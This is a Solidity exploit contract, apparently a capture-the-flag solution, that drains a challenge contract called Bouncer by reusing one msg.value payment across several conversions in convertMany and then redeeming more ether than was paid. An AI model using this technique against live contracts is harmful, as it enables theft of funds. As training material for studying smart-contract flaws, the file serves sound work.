pragma solidity 0.8.0;

import "./Setup.sol";
import "./Bouncer.sol";
import "hardhat/console.sol";

contract BouncerAttacker {
    Setup public setup;
    Bouncer public bouncer;
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 withdrawalAmount;

    constructor(Setup _setup) {
        setup = _setup;
        bouncer = _setup.bouncer();
    }

    function attack() external payable {
        uint256 bouncerBalance = address(bouncer).balance;
        console.log("initial bouncer balance: %s", bouncerBalance); // 50 + 2 ether

        // 1 ether entry fee
        // need to empty bouncer balance.
        // bouncer balance will be when we call payout:
        // initial balance + our fee + x, where x is the entry amount (need to pay ONCE in convertMany)
        // we want it to be equal to twice the payout amount, 2x
        // => 2x = IB + fees + x => x = IB + fees
        uint256 _amount = bouncerBalance + 2 * 1 ether;
        bouncer.enter{value: 1 ether}(ETH, _amount);
        bouncer.enter{value: 1 ether}(ETH, _amount);

        withdrawalAmount = _amount;
        console.log("after attack bouncer balance: %s", address(bouncer).balance);
        console.log("withdrawal amount: %s", _amount);
    }

    function attack2() external payable {
        uint256[] memory ids = new uint256[](2);
        for (uint256 i = 0; i < ids.length; i++) {
            ids[i] = i;
        }
        bouncer.convertMany{value: withdrawalAmount}(address(this), ids);

        bouncer.redeem(ERC20Like(ETH), withdrawalAmount * ids.length);

        console.log("bouncer balance %s", address(bouncer).balance);
        require(setup.isSolved(), "!solved");
    }

    receive() external payable {
      console.log("received %s", msg.value);
    }
}
